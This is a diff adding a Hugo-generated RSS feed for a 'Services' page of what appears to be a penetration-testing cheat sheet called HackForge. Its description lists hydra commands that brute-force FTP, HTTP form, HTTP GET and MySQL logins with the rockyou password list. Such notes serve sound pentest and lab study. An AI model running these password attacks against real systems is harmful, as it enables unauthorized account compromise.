@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Services :: HackForge</title>
+    <link>http://localhost:1313/bruteforce/services/index.html</link>
+    <description>Services FTP - Known user and rockyou password list&#xA;hydra -t 1 -l $user -P /usr/share/wordlists/rockyou.txt -vV $ip ftp HTTP - hydra http-post request known user&#xA;hydra -l $user -P /usr/share/wordlists/rockyou.txt $ip http-post-form &#34;&lt;Login Page&gt;:&lt;Request Body&gt;:&lt;Error Message&gt;&#34; -v -V HTTP - hydra http-get request known users&#xA;hydra -l $user -P /usr/share/wordlists/rockyou.txt -f $ip http-get /svn -V -I MYSQL - Known user and rockyou password list&#xA;hydra -l $user -P /usr/share/wordlists/rockyou.txt $ip mysql MYSQL - Username list and rockyou password list</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="http://localhost:1313/bruteforce/services/index.xml" rel="self" type="application/rss+xml" />
+  </channel>
+</rss>
